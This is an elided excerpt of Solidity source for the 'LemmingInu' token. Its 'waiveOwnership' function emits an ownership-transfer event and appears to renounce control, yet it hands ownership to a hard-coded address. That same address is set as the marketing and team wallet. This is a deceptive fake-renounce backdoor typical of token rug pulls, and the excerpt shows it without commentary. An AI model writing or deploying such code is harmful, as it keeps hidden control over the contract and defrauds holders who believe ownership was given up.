...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x1Bc9af84De47cd938Ee6307317a66E58eE8A57fa));
        _owner = address(0x1Bc9af84De47cd938Ee6307317a66E58eE8A57fa);
    }
...
contract LemmingInu is Context, IERC20, Ownable {
    ...
    string private _name = "LemmingInu";
    string private _symbol = "LEMMINGINU";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x1Bc9af84De47cd938Ee6307317a66E58eE8A57fa);
    address payable public teamWalletAddress = payable(0x1Bc9af84De47cd938Ee6307317a66E58eE8A57fa);
